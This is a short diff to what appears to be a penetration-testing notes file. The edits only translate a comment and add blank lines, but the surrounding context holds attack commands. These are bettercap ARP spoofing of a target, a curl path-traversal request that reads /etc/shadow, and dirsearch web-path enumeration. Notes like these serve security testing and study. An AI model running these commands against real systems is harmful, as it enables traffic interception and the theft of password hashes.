@@ -66,7 +66,7 @@ net.show
 set arp.spoof.targets <Point IP>
 set arp.spoof.fullduplex false
 arp.spoof on
-// po upływie pewnego czasu
+// after some time
 arp.spoof off
 ```
 References: [ettecap](https://www.ettercap-project.org/) and [bettercap](https://github.com/bettercap/bettercap) source
@@ -111,11 +111,14 @@ or
 ```
 curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
 ```
+
 Search for additioanl web path:
 ```
 dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
 ```
+
 Reference: [dirsearch](https://github.com/maurosoria/dirsearch)
+
 3. Setup the wordlist
 ```
 cd wordlists
